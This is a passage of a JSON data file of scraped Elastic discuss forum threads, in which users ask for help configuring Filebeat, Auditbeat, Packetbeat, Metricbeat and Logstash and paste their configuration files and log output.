filebeat.yml",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "93fb8aae-1206-43f4-83c6-f5c281fd4007",
    "url": "https://discuss.elastic.co/t/unable-to-create-custom-index-or-disable-ilm/224964",
    "title": "Unable to create custom index or Disable ILM",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "rehannali",
    "date": "March 26, 2020, 4:43am March 27, 2020, 6:55am March 27, 2020, 7:28am",
    "body": "Hi, I'm unable to create custom index from filebeat. I tried to disbale ilm and tried almost everything but i'm unable to disable it. configuration ###################### Filebeat Configuration Example ######################### # This file is an example configuration file highlighting only the most common # options. The filebeat.reference.yml file from the same directory contains all the # supported options with more comments. You can use it as a reference. # # You can find the full configuration reference here: # https://www.elastic.co/guide/en/beats/filebeat/index.html # For more available modules and options, please see the filebeat.reference.yml sample # configuration file. #=========================== Filebeat inputs ============================= filebeat.inputs: # Each - is an input. Most options can be set at the input level, so # you can use different inputs for various configurations. # Below are the input specific configurations. - type: log enable: true paths: - /var/log/apache2/*.log fields: apache: true log_type: apache2 fields_under_root: true - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/oneload/web/*.log #- c:\\programdata\\elasticsearch\\logs\\* # Exclude lines. A list of regular expressions to match. It drops the lines that are # matching any regular expression from the list. #exclude_lines: ['^DBG'] # Include lines. A list of regular expressions to match. It exports the lines that are # matching any regular expression from the list. #include_lines: ['^ERR', '^WARN'] # Exclude files. A list of regular expressions to match. Filebeat drops the files that # are matching any regular expression from the list. By default, no files are dropped. #exclude_files: ['.gz$'] # Optional additional fields. These fields can be freely picked # to add additional information to the crawled log files for filtering fields: log_type: jboss # level: debug # review: 1 ### Multiline options # Multiline can be used for log messages spanning multiple lines. This is common # for Java Stack Traces or C-Line Continuation # The regexp Pattern that has to be matched. The example pattern matches all lines starting with [ #multiline.pattern: ^\\[ # Defines if the pattern set under pattern should be negated or not. Default is false. #multiline.negate: false # Match can be set to \"after\" or \"before\". It is used to define if lines should be append to a pattern # that was (not) matched before or after or as long as a pattern is not matched based on negate. # Note: After is the equivalent to previous and before is the equivalent to to next in Logstash #multiline.match: after #============================= Filebeat modules =============================== filebeat.config.modules: # Glob pattern for configuration loading path: ${path.config}/modules.d/*.yml # Set to true to enable config reloading reload.enabled: false # Period on which files under path should be checked for changes #reload.period: 10s #==================== Elasticsearch template setting ========================== setup.ilm.enable: false setup.template.enable: true setup.template.name: \"index-master40-%{[agent.version]}\" setup.template.pattern: \"index-master40-%{[agent.version]}-*\" setup.template.settings: index.number_of_shards: 1 index.lifecycle.rollover_alias: \"index-master40-%{[agent.version]}\" #index.codec: best_compression #_source.enabled: false #================================ General ===================================== # The name of the shipper that publishes the network data. It can be used to group # all the transactions sent by a single shipper in the web interface. #name: # The tags of the shipper are included in their own field with each # transaction published. #tags: [\"service-X\", \"web-tier\"] # Optional fields that you can specify to add additional information to the # output. #fields: # env: staging #================================ Outputs ===================================== # Configure what output to use when sending the data collected by the beat. #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: # Array of hosts to connect to. hosts: [\"10.100.101.41:9200\"] index: \"index-master40-%{[agent.version]}-%{[fields.log_type]:other}-%{+yyyy-MM-dd}\" # Protocol - either `http` (default) or `https`. #protocol: \"https\" # Authentication credentials - either API key or username/password. #api_key: \"id:api_key\" username: \"username\" password: \"password\" #================================ Processors ===================================== # Configure processors to enhance or manipulate events generated by the beat. processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - add_kubernetes_metadata: ~ These are logs output which says ILM enable and uses default pattern. Although it creates index template but never creates index. logs Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.960+0500 INFO [publisher] pipeline/retry.go:196 retryer: send unwait-signal to consumer Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.960+0500 INFO [publisher] pipeline/retry.go:198 done Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.960+0500 INFO [publisher] pipeline/retry.go:173 retryer: send wait signal to consumer Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.960+0500 INFO [publisher] pipeline/retry.go:175 done Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.961+0500 INFO elasticsearch/client.go:757 Attempting to connect to Elasticsearch version 7.4.2 Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.983+0500 INFO [license] licenser/es_callback.go:50 Elasticsearch license: Basic Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.983+0500 INFO [index-management] idxmgmt/std.go:258 Auto ILM enable success. Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.984+0500 INFO [index-management.ilm] ilm/std.go:139 do not generate ilm policy: exists=true, overwrite=false Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.984+0500 INFO [index-management] idxmgmt/std.go:271 ILM policy successfully loaded. Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.984+0500 INFO [index-management] idxmgmt/std.go:410 Set setup.template.name to '{filebeat-7.6.1 {now/d}-000001}' as ILM is enabled. Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.984+0500 INFO [index-management] idxmgmt/std.go:415 Set setup.template.pattern to 'filebeat-7.6.1-*' as ILM is enabled. Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.984+0500 INFO [index-management] idxmgmt/std.go:453 Set settings.index.lifecycle.name in template to {filebeat {\"policy\":{\"phases\":{\"hot\":{\"actions\":{\"rollover\":{\"max_age\":\"30d\",\"max_size\":\"50gb\"}}}}}}} as ILM is enabled. Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.985+0500 INFO template/load.go:89 Template filebeat-7.6.1 already exists and will not be overwritten. Mar 25 14:17:01 oneload-app filebeat[72701]: 2020-03-25T14:17:01.985+0500 INFO [index-management] idxmgmt/std.go:295 Loaded index template. I also want to create seperate monitoring index and for custom logs i want custom index which you can see in paths. There is also i need to know if i use custom logs do i need to create manuall template for index or elasticsearch will automatically identify using key:value pair? I'm using filebeat 7.6.1.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "56576fe3-c453-45cf-b43e-cb90fa3a8d3c",
    "url": "https://discuss.elastic.co/t/fields/224799",
    "title": "Fields",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "March 24, 2020, 10:06am March 24, 2020, 4:23pm March 25, 2020, 1:32am March 25, 2020, 1:38am March 25, 2020, 2:17am March 25, 2020, 10:17am March 26, 2020, 2:36am March 26, 2020, 2:40am March 26, 2020, 3:04am March 26, 2020, 3:14am March 26, 2020, 6:12am March 26, 2020, 6:37am March 27, 2020, 1:05am March 27, 2020, 2:27am",
    "body": "",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "d68e9af4-27fb-43d5-b30c-f9a3bb60643f",
    "url": "https://discuss.elastic.co/t/filebeats-ingesting-filebeats-logs/225272",
    "title": "Filebeats ingesting filebeats logs",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "newmember",
    "date": "March 26, 2020, 7:13pm March 26, 2020, 7:50pm March 27, 2020, 1:53am",
    "body": "At first I added /var/log/filebeat/filebeat as an input in the \"inputs.d/filebeat.yml\" folder. This created a circular logging issue; ie filebeat would write data to the filebeat log file then re-read that log event in the filebeat log and send it again and then the round robin thing happens. I stopped filebeat I removed the inputs.d/filebeat.yml I renamed the filebeat cache registry folder \"mv registry registry.old.0325\" I then restarted filebeat service I still see filebeat reading in the filebeat logs. What did I miss? Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "01f29202-8e51-4e21-b558-2195194354d1",
    "url": "https://discuss.elastic.co/t/where-can-i-download-the-latest-beats-with-static-link/225184",
    "title": "Where can i download the latest beats with static link?",
    "category": [
      "Beats"
    ],
    "author": "",
    "date": "March 26, 2020, 11:54am March 27, 2020, 7:35am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "198b7246-97f5-4cfb-8ea7-148b0e730d30",
    "url": "https://discuss.elastic.co/t/building-for-ppc64le/225290",
    "title": "Building for ppc64le",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "eugeneswalker",
    "date": "March 26, 2020, 8:49pm",
    "body": "I'm trying to build the deb package for Filebeat for ppc64le . I've followed the developer guide and setup a Go environment with Python 3.7, Mage, and Virtualenv on my system. When I navigate to beats/filebeat directory and run PLATFORMS=linux/ppc64le make release it says: 2020/03/26 13:41:58 Found Elastic Beats dir at /luke-perm/go/src/github.com/elastic/beats Generated fields.yml for filebeat to /luke-perm/go/src/github.com/elastic/beats/filebeat/fields.yml No fields files for module apache2 Generated fields.yml for filebeat to /luke-perm/go/src/github.com/elastic/beats/filebeat/fields.yml >> Building filebeat.yml for linux/amd64 >> Building filebeat.reference.yml for linux/amd64 >> Building filebeat.docker.yml for linux/amd64 2020/03/26 13:42:03 Found Elastic Beats dir at /luke-perm/go/src/github.com/elastic/beats Generated fields.yml for filebeat to /luke-perm/go/src/github.com/elastic/beats/filebeat/build/fields/fields.all.yml >> package: Skipping because the platform list is empty >> Testing package contents package ran for 10.335682943s It looks like it is not recognizing the value of PLATFORMS variable... I also tried using the Docker cross-build container from https://github.com/elastic/golang-crossbuild to build for ppc64le on an x86 machine, but when I run: docker run -it --rm \\ -v $GOPATH/src/github.com/elastic/beats:/go/src/github.com/elastic/beats \\ -w /go/src/github.com/elastic/beats/filebeat \\ -e CGO_ENABLED=1 \\ docker.elastic.co/beats-dev/golang-crossbuild:1.13.9-ppc \\ --build-cmd \"make release\" \\ -p \"linux/ppc64le\" it complains about mage command not existing... Can anyone tell me what I'm doing wrong? Thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "af1f7d08-2442-490e-9d2e-164d3bf4194e",
    "url": "https://discuss.elastic.co/t/cant-setup-kibana-dashboards/225286",
    "title": "Can't setup kibana dashboards",
    "category": [
      "Beats",
      "Journalbeat"
    ],
    "author": "chimeno",
    "date": "March 26, 2020, 8:27pm",
    "body": "Debian 10 journalbeat 7.6.1 installed with apt when configured with: setup.dashboards.enabled: true journalbeat says: Error importing Kibana dashboards: fail to import the dashboards in Kibana: Error importing directory /usr/share/journalbeat/kibana: No dashboards to import. Please make sure the /usr/share/journalbeat/kibana/7 inside /usr/share/journalbeat/ . ├── bin │ ├── journalbeat │ └── journalbeat-god ├── kibana │ └── default │ └── index-pattern │ └── journalbeat.json ├── LICENSE.txt ├── NOTICE.txt └── README.md Is there any way to setup dashboards? maybe with a url or manually?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "81109238-fa76-47ed-a572-f46e70a732a8",
    "url": "https://discuss.elastic.co/t/grok-for-auditbeat-log/225213",
    "title": "Grok for auditbeat log",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "Burga",
    "date": "March 26, 2020, 2:18pm March 26, 2020, 8:12pm April 16, 2020, 8:12pm",
    "body": "Hi , I'm trying to set grok for auditbeat pipeline but getting grokparsefailure maybe someone has a sample audit grok configuration ? thanks in advance.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f9373c7e-9642-43fa-b9ea-89e0e0dd1efc",
    "url": "https://discuss.elastic.co/t/dropping-events-in-auditbeat/224483",
    "title": "Dropping events in Auditbeat",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "AaronWF",
    "date": "March 20, 2020, 9:04pm March 26, 2020, 5:40pm March 26, 2020, 6:11pm March 26, 2020, 6:17pm March 26, 2020, 6:17pm April 16, 2020, 6:17pm",
    "body": "I have Auditbeat shipping system processes directly to elastic cloud, I would like to drop the noisiest events such as Google Chrome + Renderer and 'System/Library/Frameworks' and their child processes. I have added this in the processor section, yet i still receive the events in Elasticearch. Do I need to match it more specifically/is my drop_event too general for the condition to be met? processors: - drop_event: when: contains: process.exe: “/System/Library/Frameworks” - drop_event: when: contains: process.exe: “/Applications/Google Chrome.app/“",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "a86d39f0-e64f-470b-9d24-6d38b3b3da42",
    "url": "https://discuss.elastic.co/t/siem-not-found/225023",
    "title": "SIEM not found",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "alireza_MHZ",
    "date": "March 25, 2020, 4:28pm March 26, 2020, 6:02pm April 16, 2020, 5:54pm",
    "body": "hi i have setup auditbeat and Data successfully received as the kibana said. but when i click on SIEM APP Application Not Found No application was found at this URL. Try going back or choosing an app from the menu. why? thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "20bf8781-e4fb-441b-9819-3809871b1625",
    "url": "https://discuss.elastic.co/t/error-system-socket-dataset-setup-failed/222603",
    "title": "Error: system/socket dataset setup failed",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "rowe",
    "date": "March 8, 2020, 1:38pm March 9, 2020, 8:21am March 9, 2020, 7:53pm March 10, 2020, 11:20am March 10, 2020, 11:49am March 11, 2020, 11:46am March 11, 2020, 11:50am March 11, 2020, 11:53am March 11, 2020, 2:52pm March 11, 2020, 2:58pm March 26, 2020, 5:31pm April 16, 2020, 5:30pm",
    "body": "auditbeat1898×966 95.7 KB Hi! I'm new at this and trying to get Auditbeat running on my Synology NAS (DS918+, x86_64) but there are errors when I try to start it (with ./auditbeat -e). Can anyone tell me if there is something I can do to fix it, or if it just won't work with the current kernel (?). Thanks!",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "d97babae-3e18-411d-9e74-55f871ae5926",
    "url": "https://discuss.elastic.co/t/atlas-mongodb-cluster-not-working-with-metricbeat/225177",
    "title": "Atlas Mongodb cluster not working with metricbeat",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Rohail1",
    "date": "March 26, 2020, 11:29am March 26, 2020, 5:25pm",
    "body": "Hello, I am unable to connect my atlas cluster with metric. If I use self-hosted MongoDB URL it works fine but if I use atlas cluster it throws an error saying \"no reachable servers\"",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f7a8f826-d692-4624-a62d-b51feb1460f6",
    "url": "https://discuss.elastic.co/t/packetbeat-loss-data-when-monitor-mysql/225149",
    "title": "Packetbeat loss data when monitor mysql",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "Romber_Li",
    "date": "March 26, 2020, 9:22am",
    "body": "I deployed packbeat on a mysql server to capture mysql traffic, and then send to the kafka, but I found that, QPS that was sent to kafka was much lower than I saw in monitoring system(I use Percona Monitoring and Management(PMM) to monitor mysql database). after checking the packbeat log, we found that there are many \"unmatched_responses\", so here are my questions: what does \"unmatched_responses\" mean? I did not find explain in document, did I miss something? as you can see the monitor screenshot blow, the QPS of mysql server is about 20000, but as the log of packetbeat, it only published approximately 200000 to kafka, this log was printed every 30secons, which means 6666 QPS, which is much smaller than what PMM shows.why is that? even there are huge amount of \"unmatched_responses\"(approximately 140000), the summary of \"published\" + \"unmatched_responses\" is 340000, divided by 30, that is 11333, still much smaller than what PMM shows, so how can I get the same data between PMM and packetbeat? QPS showed by PMM: image1798×536 52.5 KB packbeat log: 2020-03-26T16:50:10.995+0800 INFO [monitoring] log/log.go:145 Non-zero metrics in the last 30s {\"monitoring\": {\"metrics\": {\"beat\":{\"cpu\":{\"system\":{\"ticks\":53030,\"time\":{\"ms\":6254}},\"total\":{\"ticks\":965690,\"time\":{\"ms\":140400},\"value\":965690},\"user\":{\"ticks\":912660,\"time\":{\"ms\":134146}}},\"handles\":{\"limit\":{\"hard\":4096,\"soft\":1024},\"open\":18},\"info\":{\"ephemeral_id\":\"f65eecf1-0f47-4452-9e38-2f70d532a1a8\",\"uptime\":{\"ms\":210037}},\"memstats\":{\"gc_next\":50600592,\"memory_alloc\":51149800,\"memory_total\":230887573952,\"rss\":24576},\"runtime\":{\"goroutines\":62}},\"libbeat\":{\"config\":{\"module\":{\"running\":0}},\"output\":{\"events\":{\"acked\":200704,\"active\":256,\"batches\":785,\"total\":200960}},\"outputs\":{\"kafka\":{\"bytes_read\":1865808,\"bytes_write\":38026679}},\"pipeline\":{\"clients\":1,\"events\":{\"active\":306,\"failed\":5157,\"published\":200925,\"total\":206082},\"queue\":{\"acked\":200704}}},\"mysql\":{\"unmatched_requests\":540,\"**unmatched_responses\":138995**},\"system\":{\"load\":{\"1\":7.49,\"15\":7.42,\"5\":7.1,\"norm\":{\"1\":0.156,\"15\":0.1546,\"5\":0.1479}}},\"tcp\":{\"dropped_because_of_gaps\":17}}}} packetbeat.yml(I masked the IP address): path.home: /data/app/packetbeat max_procs: 6 logging: level: info to_files: true files: name: packetbeat.log keepfiles: 5 rotateeverybytes: 20971520 permissions: 0644 interval: 168h packetbeat.ignore_outgoing: true packetbeat.interfaces.device: any packetbeat.interfaces.type: af_packet packetbeat.interfaces.buffer_size_mb: 2048 packetbeat.flows: enabled: false processors: - add_locale: format: offset - drop_fields: fields: [\"host\", \"ecs\", \"agent\"] # packetbeat.interfaces.bpf_filter: \"port 3306 or port 7001 or port 7002\" packetbeat.protocols: # mysql - type: mysql enabled: true ports: [3306, 3307, 3308, 3309, 3310] send_request: false send_response: false max_rows: 100 max_row_length: 10485760 processors: - include_fields: fields: [\"name\", \"tags\", \"client\", \"server\", \"type\", \"method\", \"event\", \"query\", \"mysql\"] - add_fields: target: '' fields: cluster_name: ${cluster_name_mysql:mysql} - drop_fields: fields: [\"event.dataset\", \"event.kind\", \"event.category\"] # redis - type: redis enabled: false ports: [6379, 7001, 7002] send_request: false send_response: false queue_max_bytes: 1048576 queue_max_messages: 20000 processors: - include_fields: fields: [\"name\", \"tags\", \"client\", \"server\", \"type\", \"method\", \"resource\", \"event\", \"redis\"] - add_fields: target: '' fields: cluster_name: ${cluster_name_redis:redis} - drop_fields: fields: [\"event.dataset\", \"event.kind\", \"event.category\"] queue.mem: events: 10240 flush.min_events: 256 flush.timeout: 1s # output configuration # file output: file: enabled: false path: \"/data/app/packetbeat/data\" filename: \"packetbeat_file.out\" number_of_file: 5 rotate_every_kb: 20480 #codec.json: # pretty: true #codec.format: # string: '%{[@timestamp]} %{[message]}' # kafka kafka: enabled: true hosts: [\"xxx.xxx.xxx.xxx:9092\", \"xxx.xxx.xxx.xxx:9092\", \"xxx.xxx.xxx.xxx:9092\", \"xxx.xxx.xxx.xxx:9092\", \"xxx.xxx.xxx.xxx:9092\"] topic: \"packetbeat_mysql_01\" partition.round_robin: reachable_only: true metadata: refresh_frequency: 5m full: false #codec.json: # pretty: true #codec.format: # string: '%{[@timestamp]} %{[message]}'",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7cf7a015-c3af-49e4-af24-9ad7f208de32",
    "url": "https://discuss.elastic.co/t/oss-version-of-packetbeat-trying-xpack-endpoint/225106",
    "title": "OSS version of packetbeat trying xpack endpoint",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "shantanuo",
    "date": "March 26, 2020, 3:47am",
    "body": "Packetbeat version 6.8.5 was working fine. When I upgraded to 7.6.1 I got an error while connecting to AWS elasticsearch server. I am using OSS version and as promised it wasn't trying any _xpack/ endpoints in the older version. What has changed since last 2-3 months?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8ad91767-698a-44fd-a60d-a68808d371b2",
    "url": "https://discuss.elastic.co/t/log-files-which-sometimes-contain-no-data/224937",
    "title": "Log files which sometimes contain no data",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "stantanev",
    "date": "March 25, 2020, 4:41am March 25, 2020, 9:58am March 25, 2020, 10:27pm",
    "body": "hi everyone, how does filebeat handle the case where a different log file is received every hour from a cloud system and sometimes the received files have no data (0kb). ? Do these files with no data cause any issues for filebeat?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "dfd95ac6-4f2e-478a-852b-646a842d3ad5",
    "url": "https://discuss.elastic.co/t/error-when-startingmetricbeat-with-v7-5-3/224491",
    "title": "Error when startingmetricbeat with v7.5.3",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "vee",
    "date": "March 20, 2020, 9:14pm March 23, 2020, 7:59pm March 24, 2020, 2:30pm March 24, 2020, 4:14pm March 24, 2020, 6:17pm March 24, 2020, 6:23pm March 24, 2020, 6:42pm March 24, 2020, 6:44pm March 24, 2020, 7:23pm March 24, 2020, 7:24pm March 24, 2020, 7:43pm March 24, 2020, 8:29pm March 24, 2020, 8:33pm March 24, 2020, 9:36pm March 25, 2020, 1:46pm March 25, 2020, 2:14pm March 25, 2020, 3:27pm March 25, 2020, 3:41pm March 25, 2020, 7:17pm March 25, 2020, 7:23pm",
    "body": "I see this error when trying to start metricbeat on ppc64le system: 2020-03-20T15:47:22.639-0500 ERROR pipeline/output.go:100 Failed to connect to backoff(elasticsearch(http://elasticdev:9200)): Connection marked as failed because the onConnect callback failed: resource 'metricbeat-7.5.3' exists, but it is not an alias Here's the command to start: metricbeat -E path.config=/tmp/metricbeat -e -c /tmp/metricbeat/metricbeat.yml Here is the metricbeat.yml: metricbeat.config.modules: path.config: /tmp/metricbeat/current_metricbeat metricbeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: true reload.period: 10s metricbeat.modules: - module: system metricsets: [cpu] cpu.metrics: [percentages,normalized_percentages] - module: system metricsets: [process] processes: ['.*'] process.cgroups.enabled: false process.cmdline.cache.enabled: true process.include_top_n: by_cpu: 20 # include top 20 processes by CPU by_memory: 20 # include top 20 processes by memory - module: system period: 10m metricsets: - filesystem - fsstat filesystem.ignore_types: [nfs, smbfs, autofs, rpc_pipefs, rootfs] processors: - drop_event.when.regexp: system.filesystem.mount_point: '^/(dev|run|sys|fs|host|lib|tmpfs|boot|proc)($|/)' - module: system period: 10s metricsets: - load - memory - network - process_summary - diskio - module: system period: 15m metricsets: - uptime - module: system metricsets: [core] core.metrics: [percentages] setup.template.enabled: false setup.template.settings: index.number_of_shards: 1 index.codec: best_compression output.elasticsearch: hosts: [\"http://elastic1.ulinedm.com:9200\" , \"http://elastic2.ulinedm.com:9200\"] username: elastic password: xyz logging.level: info logging.to_files: true logging.files: path: /logs/metricbeat name: metricbeat.log keepfiles: 7",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "5b179326-50a6-4b63-9a55-7ef19af2d1ee",
    "url": "https://discuss.elastic.co/t/using-modules-and-custom-logs/224186",
    "title": "Using Modules and Custom logs",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "bmclellan",
    "date": "March 18, 2020, 9:17pm March 18, 2020, 9:52pm March 19, 2020, 11:47am March 22, 2020, 7:57pm March 25, 2020, 5:46pm April 22, 2020, 5:46pm",
    "body": "Hello, Is it possible to use the modules that come with filebeat and create your own custom logs as well? I attempted to follow the file structure of the 'iis' module and create my own, but it doesn't seem to be processing the pipeline I have made (despite it working in the pipeline/_simulation) Thanks!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "113dfe80-3243-4d0f-8779-5ba06228d81d",
    "url": "https://discuss.elastic.co/t/filebeat-7-5-1-logging-files-path-is-not-working/224750",
    "title": "Filebeat 7.5.1 logging.files.path is not working",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "kyle_che",
    "date": "March 23, 2020, 11:48pm March 24, 2020, 10:32am March 24, 2020, 2:30pm March 24, 2020, 9:52pm March 25, 2020, 9:21am March 25, 2020, 2:48pm March 25, 2020, 2:58pm March 25, 2020, 3:26pm March 25, 2020, 3:30pm March 25, 2020, 4:38pm March 25, 2020, 5:46pm April 22, 2020, 5:46pm",
    "body": "I have put the following in my filebeats for 7.5.1 but everything is being logged to syslog still. any idea on why? logging.level: info logging.to_syslog: false logging.to_files: true logging.files: path: /var/log/filebeat name: filebeat keepfiles: 7 permissions: 0644",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "da5fe20a-71c8-48ea-b80f-60a93f587297",
    "url": "https://discuss.elastic.co/t/running-filebeat-as-ecs-daemon/224958",
    "title": "Running filebeat as ECS daemon",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Alexander_Popov",
    "date": "March 25, 2020, 9:00am March 25, 2020, 9:07am March 25, 2020, 2:49pm April 22, 2020, 2:49pm",
    "body": "I want to run filebeat as AWS ECS daemon My plan is to attach volume in filebeat daemon as /var/log/app and same volumes in all app containers. Each container will write logs in /var/log/app/$container_id folder questions: is my plan ok? or there is better solutions? can I expose folder ($container_id) name as additional parameter when sending logs?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "5b06008e-cb35-4139-ba0c-83cf8324fc4f",
    "url": "https://discuss.elastic.co/t/how-filebeat-chooses-module-paths-based-on-os-when-running-inside-docker/224921",
    "title": "How filebeat chooses module paths based on OS when running inside docker",
    "category": [
      "Beats"
    ],
    "author": "micas",
    "date": "March 24, 2020, 9:59pm March 25, 2020, 9:27am March 25, 2020, 12:46pm April 22, 2020, 2:46pm",
    "body": "I have filebeat running on a docker container, on the documentation it says that when activating a module, if i leave the paths as default it will choose the path based on the OS. Obviously i want to capture the log files of the HOST. How is filebeat made aware of the HOST OS in order to make that decision ? or will it just assume the paths of the container OS?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ce3b3e53-196d-4e93-b9b0-846defb99933",
    "url": "https://discuss.elastic.co/t/packetbeat-postgres-module-no-data/224983",
    "title": "Packetbeat: Postgres Module No Data",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "dawiro",
    "date": "March 25, 2020, 12:24pm April 22, 2020, 12:24pm",
    "body": "Hi, I'm trying to test packetbeat (6.8.7) for tracking postgres transactions. I have flow, dns and pgsql modules enabled. I have the index template loaded and am seeing data in kibana for types flow and dns. However, I'm seeing no data appearing for postgres. I've turned on debug logging and see this in the logs: 2020-03-25T12:07:14.486Z DEBUG [pgsql] pgsql/parse.go:36 pgsqlMessageParser, off=0 2020-03-25T12:07:14.486Z DEBUG [pgsqldetailed] pgsql/parse.go:58 parseMessageStart 2020-03-25T12:07:14.486Z DEBUG [pgsqldetailed] pgsql/parse.go:124 Wait for more data 2020-03-25T12:07:14.486Z DEBUG [pgsqldetailed] pgsql/parse.go:51 pgsqlMessageParser return: ok=true, complete=false, off=0 2020-03-25T12:07:14.486Z DEBUG [pgsqldetailed] pgsql/pgsql.go:261 Len data: 23749 cap data: 24576 ...endlessly repeated with no errors. I'm also seeing no errors in the elasticsearch logs. What do I need to do in order capture and index this postgres data? Thx D",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4020e71b-b77a-4a92-a76d-10742d8ade52",
    "url": "https://discuss.elastic.co/t/about-the-logstash-category/35",
    "title": "About the Logstash category",
    "category": [
      "Logstash"
    ],
    "author": "Leslie_Hawthorn",
    "date": "October 30, 2015, 11:52pm July 6, 2017, 4:25am",
    "body": "Everything related to your favorite centralized logging platform, including plugins and recipes.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ce77e14e-87c0-43e7-a794-46d1b247cd9e",
    "url": "https://discuss.elastic.co/t/help-transforming-json-document-for-output-to-influxdb/229351",
    "title": "Help transforming json document for output to InfluxDB",
    "category": [
      "Logstash"
    ],
    "author": "john.houghton",
    "date": "April 22, 2020, 8:50pm",
    "body": "From an application, we generate well-formed json responses into a text file (read: structured output from Telegraf for InfluxDB, formatted in json), e.g. {\"tags\":{\"tag_1\":\"tag_1_value\",\"tag_2\":\"tag_2_value\"},\"fields\":{\"field_1\":31,\"field_2\":\"two words\"},\"name\":\"test_meas\",\"timestamp\":1458229140000} ...parsed with jq for readability here: { \"tags\": { \"tag_1\": \"tag_1_value\", \"tag_2\": \"tag_2_value\" }, \"fields\": { \"field_1\": 31, \"field_2\": \"two words\" }, \"name\": \"test_meas\", \"timestamp\": 1458229140000 } Filebeat picks up these text files and passes them to Logstash for enrichment and ultimately output into InfluxDB. My goal is to have many different metrics use the same Logstash code, without having to manually code Logstash for each different metric being output. The inbound json documents is already defined with both the structure and the data that will go into InfluxDB. So far, I have used a json output plugin to parse the field \"message\" into a field \"payload\". (I did this so I don't have to deal with all of the extraneous data that comes with the document, e.g. host, agent, log, ecs, @version, etc. and to future proof it from other new fields.) So, as I see it, use_event_fields_for_data_points is not appropriate here since I am only using a subset of the fields in the document. But this is where I get stuck. As I understand it, I need InfluxDB output plugin's \"data_points\" to have ALL of the tags and fields. And \"send_as_tags\" needs to have an to enumerate list of the tags. Lastly, I need to coerce values that should be integers for consistency. QUESTIONS Is there any elegant way to translate the payload's field and tag nodes into the hash that the data_points expects? Is there any elegant way to translate the payload's tag node to generate the array that send_as_tags expects? Still to be resolved: how to enumerate a set of \"coerce_values\" keys for those fields that end in \"i\" to be integers (bonus credit)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e56a5b9a-86f9-4dab-8b89-1f7280806f07",
    "url": "https://discuss.elastic.co/t/http-input-plugin-basic-question/229108",
    "title": "Http Input Plugin - basic question",
    "category": [
      "Logstash"
    ],
    "author": "Karanbir_Mann",
    "date": "April 21, 2020, 5:40pm April 21, 2020, 6:43pm April 21, 2020, 8:26pm April 21, 2020, 9:25pm April 22, 2020, 7:39pm",
